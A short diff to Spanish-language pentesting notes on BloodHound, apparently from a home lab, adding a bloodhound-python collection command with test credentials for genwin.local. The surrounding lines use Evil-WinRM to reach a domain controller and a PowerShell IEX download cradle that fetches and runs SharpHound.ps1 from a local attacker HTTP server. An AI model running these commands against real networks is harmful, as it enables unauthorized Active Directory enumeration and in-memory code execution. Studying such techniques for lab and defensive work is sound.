@@ -15,6 +15,9 @@ Bloodhound:
 Comandos:
 
 Crear data (.zip) y subirlo al bloodhound: 
+    - bloodhound -u test -p test -d genwin.local -v --zip -c All -dc genwin.local -ns 192.168.56.254
+
+    otra forma:
     - Descargar SharpHound.ps1 de github: wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
     - Evil-wirm al DC. 
     - IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/SharpHound.ps1')
